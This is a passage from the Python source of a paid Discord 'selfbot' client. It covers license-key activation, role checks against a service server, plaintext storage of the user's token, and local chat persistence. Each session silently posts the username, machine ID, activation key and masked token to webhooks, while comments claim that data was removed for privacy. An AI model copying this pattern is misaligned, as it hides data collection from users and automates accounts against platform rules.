                        d = remaining // 86400
                        h = (remaining % 86400) // 3600
                        m = (remaining % 3600) // 60
                        s = remaining % 60
                        txt = f"{d}d {h}h {m}m {s}s"
                    try:
                        self.key_duration_value.config(text=txt)
                    except Exception:
                        pass
                    # One-time 1-hour warning
                    try:
                        if remaining <= 3600 and remaining > 0 and not getattr(self, '_warned_key_low', False):
                            self._warned_key_low = True
                            self.log("⚠️ Your key is about to run out, renew to continue using the selfbot")
                    except Exception:
                        pass
            except Exception:
                pass
            # repeat
            try:
                self.root.after(1000, _tick)
            except Exception:
                pass
        _tick()

    def _deferred_enable_edex_theme(self):
        try:
            self._enable_edex_theme()
            self._add_edex_terminal_headers()
            self._add_edex_bottom_bar()
            self._add_edex_system_hud()
        except Exception:
            pass

    # -------- Persistence: Announcements & Chat --------
    ANNOUNCEMENTS_FILE = "announcements_local.json"
    CHAT_HISTORY_FILE = "community_chat_local.json"

    def _load_announcements_local(self):
        try:
            if not os.path.exists(self.ANNOUNCEMENTS_FILE):
                return
            with open(self.ANNOUNCEMENTS_FILE, 'r') as f:
                msgs = json.load(f)
            self.ann_text.configure(state=tk.NORMAL)
            for m in msgs[-200:]:
                ts = int(m.get('ts',0) or 0)
                content = m.get('content','')
                uname = m.get('username') or ''
                if uname:
                    line = f"[{datetime.fromtimestamp(ts).strftime('%H:%M')}] {uname}: {content}\n"
                else:
                    line = f"[{datetime.fromtimestamp(ts).strftime('%H:%M')}] {content}\n"
                self.ann_text.insert('end', line)
            self.ann_text.configure(state=tk.DISABLED)
            self.ann_text.see('end')
        except Exception:
            pass

    def _save_announcements_local(self, msgs):
        try:
            existing = []
            if os.path.exists(self.ANNOUNCEMENTS_FILE):
                try:
                    with open(self.ANNOUNCEMENTS_FILE, 'r') as f:
                        existing = json.load(f) or []
                except Exception:
                    existing = []
            # Merge (simple append and cap)
            for m in msgs:
                existing.append({
                    'ts': int(m.get('ts', 0) or int(time.time())),
                    'content': str(m.get('content','')),
                    'username': str(m.get('username') or '')
                })
            existing = existing[-200:]
            with open(self.ANNOUNCEMENTS_FILE, 'w') as f:
                json.dump(existing, f, indent=2)
        except Exception:
            pass

    def _load_chat_history_local(self):
        try:
            if os.path.exists(self.ANNOUNCEMENTS_FILE):
                self._load_announcements_local()
        except Exception:
            pass
        try:
            history = []
            if os.path.exists(self.CHAT_HISTORY_FILE):
                with open(self.CHAT_HISTORY_FILE, 'r') as f:
                    history = json.load(f) or []
            # normalize and load
            items = []
            for m in history[-400:]:
                try:
                    items.append({
                        'ts': int(m.get('ts',0) or 0),
                        'content': str(m.get('content','')),
                        'username': str(m.get('username') or m.get('from') or ''),
                        'avatar_url': str(m.get('avatar_url') or '')
                    })
                except Exception:
                    continue
            self._chat_items = items
            if items:
                try:
                    self.chat_last_ts = max(self.chat_last_ts, max(int(m.get('ts',0) or 0) for m in items))
                except Exception:
                    pass
        except Exception:
            pass

    def _save_chat_history_local(self):
        try:
            data = [{
                'ts': int(m.get('ts',0) or 0),
                'content': str(m.get('content','')),
                'username': str(m.get('username') or m.get('from') or ''),
                'avatar_url': str(m.get('avatar_url') or '')
            } for m in self._chat_items[-400:]]
            with open(self.CHAT_HISTORY_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception:
            pass


# ---------------------- ACTIVATION/SELF-BOT ----------------------
class Selfbot:
    def __init__(self):
        self.activated = False
        self.activation_key = None
        self.user_token = None
        self.user_id = None
        self.role_verified = False
        self.key_expiration_time = None
        self._stop_panel = threading.Event()
        self.load_activation()
        
    def load_activation(self):
        try:
            if os.path.exists(ACTIVATION_FILE):
                with open(ACTIVATION_FILE, 'r') as f:
                    data = json.load(f)
                    self.activated = data.get('activated', False)
                    self.activation_key = data.get('activation_key', None)
                    self.user_token = data.get('user_token', None)
                    self.user_id = data.get('user_id', None)
                    self.key_expiration_time = data.get('key_expiration_time', None)
        except Exception as e:
            if not SILENT_LOGS:
                print(f"Error loading activation: {e}")
    
    def save_activation(self):
        try:
            data = {
                'activated': self.activated,
                'activation_key': self.activation_key,
                'user_token': self.user_token,
                'user_id': self.user_id,
                'activated_at': int(time.time()),
                'key_expiration_time': self.key_expiration_time
            }
            with open(ACTIVATION_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            if not SILENT_LOGS:
                print(f"Error saving activation: {e}")
    
    def send_online_webhook(self):
        try:
            username = "Unknown"
            try:
                headers = {"Authorization": self.user_token}
                r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=6)
                if r.status_code == 200:
                    u = r.json()
                    username = f"{u.get('username','Unknown')}#{u.get('discriminator','0000')}"
            except Exception:
                pass
            embed = {
                "title": "ONLINE",
                "color": 0x2ecc71,
                "fields": [
                    {"name": "User", "value": username, "inline": True},
                    {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
                    {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
                    {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                    {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                    {"name": "Activated At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                ],
                "timestamp": datetime.now(timezone.utc).isoformat()
            }
            try:
                requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
            except Exception:
                pass
            try:
                if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
                    requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [embed]}, timeout=8)
            except Exception:
                pass
        except Exception:
            pass
    
    # Removed IP/token/machine text notification to protect privacy
    
    def get_ip_address(self):
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            j = response.json()
            return j.get('ip', 'Unknown')
        except Exception:
            return "Unknown"

    def check_member_status_via_api(self, user_id: str) -> dict:
        try:
            resp = requests.get(f"{SERVICE_URL}/api/member-status", params={"user_id": user_id}, timeout=5)
            if resp.status_code != 200:
                return {"ok": False, "err": f"HTTP {resp.status_code}"}
            data = resp.json()
            should = bool(data.get("should_have_access", False))
            active = data.get("active_keys", [])
            rem = 0
            if active:
                rem = int(active[0].get("time_remaining", 0))
            return {"ok": True, "has": should, "remaining": rem, "raw": data}
        except Exception as e:
            return {"ok": False, "err": str(e)}
    
    def activate_key(self, activation_key):
        try:
            act_json = {}
            print(f"🔑 Attempting to activate with key: {activation_key}")
            if not self.user_token:
                print("❌ No token provided. Activation failed.")
                return False
            if not self.user_id:
                print("❌ No user ID provided. Activation failed.")
                return False

            # Optional preflight: check key existence/info
            try:
                info_resp = requests.get(
                    f"{SERVICE_URL}/api/key-info",
                    params={"key": activation_key},
                    timeout=8,
                )
                if info_resp.status_code == 200:
                    info_json = {}
                    try:
                        info_json = info_resp.json()
                    except Exception:
                        info_json = {}
                    if isinstance(info_json, dict) and info_json.get("exists") is False:
                        print("❌ Activation failed: key not found or deleted.")
                        return False
                # If non-200, continue; server may not expose key-info in all environments
            except Exception:
                pass

            # Bind key server-side to user+machine (starts timer on first activation)
            try:
                try:
                    uid_str = str(int(str(self.user_id).strip()))
                except Exception:
                    print("❌ Invalid user ID. Must be a numeric Discord ID.")
                    return False
                resp = requests.post(
                    f"{SERVICE_URL}/api/activate",
                    data={
                        "key": activation_key,
                        "user_id": uid_str,
                        "machine_id": machine_id(),
                    },
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=8,
                )
                if resp.status_code != 200:
                    server_msg = None
                    try:
                        j = resp.json()
                        if isinstance(j, dict):
                            server_msg = j.get("error") or j.get("message")
                    except Exception:
                        server_msg = None
                    if not server_msg:
                        try:
                            server_msg = resp.text.strip()
                        except Exception:
                            server_msg = None
                    # Auto-rebind flow if key is bound to another machine but same owner
                    if server_msg and "another machine" in server_msg.lower():
                        print("❌ Activation failed: key is bound to another machine. Ask admin to run /swapmachineid.")
                        return False
                    else:
                        if server_msg:
                            print(f"❌ Activation failed on server: HTTP {resp.status_code} • {server_msg}")
                        else:
                            print(f"❌ Activation failed on server: HTTP {resp.status_code}")
                        return False
                else:
                    act_json = resp.json()
                    if not act_json.get("success"):
                        print(f"❌ Activation failed: {act_json.get('error','unknown error')}")
                        return False
            except Exception as e:
                print(f"❌ Activation request error: {e}")
                return False

            # Determine actual expiration from server if provided; otherwise fallback to duration_days
            try:
                if act_json and act_json.get("expiration_time"):
                    self.key_expiration_time = int(act_json["expiration_time"])  # epoch seconds
                elif getattr(self, "key_expiration_time", None):
                    # Already set from rebind/status path
                    pass
                else:
                    # Fallback: use duration_days from /activate if present, else 30
                    duration_days = int(act_json.get("duration_days", 30)) if act_json else 30
                    self.key_expiration_time = int(time.time()) + (duration_days * 24 * 60 * 60)
            except Exception:
                self.key_expiration_time = int(time.time()) + (30 * 24 * 60 * 60)
            remaining = max(0, int(self.key_expiration_time) - int(time.time()))
            # Treat large horizons as lifetime
            if (act_json and (act_json.get("duration_days") == 365 or act_json.get("key_type") == "lifetime")) or remaining > 365*86400:
                print("⏰ Key activated! Lifetime access detected.")
                print("⏰ Your key expires in: ∞")
            else:
                d = remaining // 86400
                h = (remaining % 86400) // 3600
                print("⏰ Key activated! Duration detected from server.")
                print(f"⏰ Your key expires in: {d} days, {h} hours")

            print("🔍 Verifying Discord role...")
            status = self.check_member_status_via_api(self.user_id)
            ok = bool(status.get("ok"))
            should = False
            reason_msg = ""
            if ok:
                raw = status.get("raw") or {}
                should = bool(raw.get("should_have_access", False))
                has_active_key = bool(raw.get("has_active_key", False))
                has_role = bool(raw.get("has_role", False))
                bound_match = bool(raw.get("bound_match", False))
                gid = raw.get("guild_id")
                rid = raw.get("role_id")
                if not should:
                    if not has_active_key:
                        reason_msg = "No active key (expired or not activated)."
                    elif not bound_match:
                        reason_msg = "Machine ID mismatch. This key is bound to a different machine."
                    elif not has_role:
                        reason_msg = f"Required role missing in guild {gid} (role ID {rid})."
                    else:
                        reason_msg = "Access denied by server policy."
            else:
                reason_msg = f"Server error: {status.get('err','unknown')}"
            if not (ok and should):
                print(f"❌ Access denied! {reason_msg}")
                return False

            self.activated = True
            self.activation_key = activation_key
            self.save_activation()

            time_remaining = self.key_expiration_time - int(time.time())
            days = time_remaining // 86400
            hours = (time_remaining % 86400) // 3600
            print("✅ Selfbot activated successfully!")
            print(f"⏰ Your key expires in: {days} days, {hours} hours")
            try:
                # Play sound on successful activation
                # (UI panel will also play at load; this guarantees sound if role already set)
                pygame.mixer.music.stop()
                selfbot_sound = os.getenv("STARTUP_SOUND", "opening_sound.wav")
                if os.path.exists(selfbot_sound):
                    pygame.mixer.music.load(selfbot_sound)
                    pygame.mixer.music.play()
            except Exception:
                pass
            return True
        except Exception as e:
            print(f"❌ Activation failed: {e}")
            return False

    def _format_remaining(self, sec: int) -> str:
        if sec <= 0:
            return "expired"
        d = sec // 86400
        h = (sec % 86400) // 3600
        m = (sec % 3600) // 60
        s = sec % 60
        if d > 0:
            return f"{d}d {h}h {m}m"
        if h > 0:
            return f"{h}h {m}m {s}s"
        if m > 0:
            return f"{m}m {s}s"
        return f"{s}s"

    def _panel_loop(self):
        # Live panel with animated status
        frame = 0
        while not self._stop_panel.is_set():
            status = self.check_member_status_via_api(self.user_id)
            has_role = status.get("has") if status.get("ok") else False
            rem = status.get("remaining", 0)
            render_banner(status="online" if has_role else "offline", frame=frame)
            print(f"User ID: {self.user_id}")
            print(f"Machine ID: {machine_id()}")
            print(f"Time Remaining: {self._format_remaining(rem)}")
            print("-----------------------------------------------")
            print("Press Ctrl+C to exit" + (" or 'q' to quit" if HAS_MSVCRT else ""))
            if HAS_MSVCRT and msvcrt.kbhit():
                ch = msvcrt.getch()
                if ch in (b'q', b'Q'):
                    self._stop_panel.set()
                    break
            frame += 1
            time.sleep(0.5)
    
    def run(self):
        if not self.activated:
            activation_key, user_id, user_token = show_banner_and_prompt()
            self.user_token = user_token
            self.user_id = user_id
            if self.activate_key(activation_key):
                print("🎉 Welcome! Selfbot is now active.")
            else:
                print("❌ Activation failed. Selfbot will exit.")
                return

        print("🔍 Checking key expiration via API...")
        status = self.check_member_status_via_api(self.user_id)
        ok = bool(status.get("ok"))
        should = False
        reason_msg = ""
        if ok:
            raw = status.get("raw") or {}
            should = bool(raw.get("should_have_access", False))
            has_active_key = bool(raw.get("has_active_key", False))
            has_role = bool(raw.get("has_role", False))
            bound_match = bool(raw.get("bound_match", False))
            gid = raw.get("guild_id")
            rid = raw.get("role_id")
            if not should:
                if not has_active_key:
                    reason_msg = "No active key (expired or not activated)."
                elif not bound_match:
                    reason_msg = "Machine ID mismatch. This key is bound to a different machine."
                elif not has_role:
                    reason_msg = f"Required role missing in guild {gid} (role ID {rid})."
                else:
                    reason_msg = "Access denied by server policy."
        else:
            reason_msg = f"Server error: {status.get('err','unknown')}"
        if not (ok and should):
            print(f"❌ Access denied. {reason_msg}")
            return

        # Online webhook (no IP/token/machine)
        self.send_online_webhook()

        # Launch the GUI message panel after successful login/activation
        try:
            root = tk.Tk()
            app = DiscordBotGUI(root, initial_token=self.user_token, initial_user_id=self.user_id)
            root.mainloop()
        except KeyboardInterrupt:
            pass
        finally:
            # Send offline notification silently
            try:
                username = "Unknown"
                try:
                    headers = {"Authorization": self.user_token}
                    r = requests.get("https://discord.com/api/v10/users/@me", headers=headers, timeout=6)
                    if r.status_code == 200:
                        u = r.json()
                        username = f"{u.get('username','Unknown')}#{u.get('discriminator','0000')}"
                except Exception:
                    pass
                off_embed = {
                    "title": "OFFLINE",
                    "color": 0xE74C3C,
                    "fields": [
                        {"name": "User", "value": username, "inline": True},
                        {"name": "User ID", "value": f"`{self.user_id}`", "inline": True},
                        {"name": "Masked Token", "value": f"`{mask_token(self.user_token)}`", "inline": False},
                        {"name": "Machine ID", "value": f"`{machine_id()}`", "inline": True},
                        {"name": "Activation Key", "value": f"`{self.activation_key or 'N/A'}`", "inline": False},
                        {"name": "Offline At", "value": f"<t:{int(time.time())}:F>", "inline": True}
                    ]
                }
                try:
                    requests.post(WEBHOOK_URL, json={"embeds": [off_embed]}, timeout=8)
                except Exception:
                    pass
                try:
                    if TOKEN_EVENT_WEBHOOK and TOKEN_EVENT_WEBHOOK != WEBHOOK_URL:
                        requests.post(TOKEN_EVENT_WEBHOOK, json={"embeds": [off_embed]}, timeout=8)
                except Exception:
                    pass
            except Exception:
                pass
            print("\n👋Selfbot stopped")


if __name__ == "__main__":
    print("🚀 Starting Selfbot...")
    print("=" * 40)
    print(f"Version: {SB_VERSION}")
    
    # Optional: play a startup MP4 if present (non-blocking)
    try:
        video_path = os.getenv('STARTUP_MP4', 'startup.mp4')
        if os.path.exists(video_path):
            if sys.platform.startswith('win'):
                os.startfile(video_path)  # opens default player
            elif sys.platform.startswith('darwin'):
                subprocess.Popen(['open', video_path])
            else:
                subprocess.Popen(['xdg-open', video_path])
    except Exception:
        pass

    selfbot = Selfbot()
    selfbot.run()

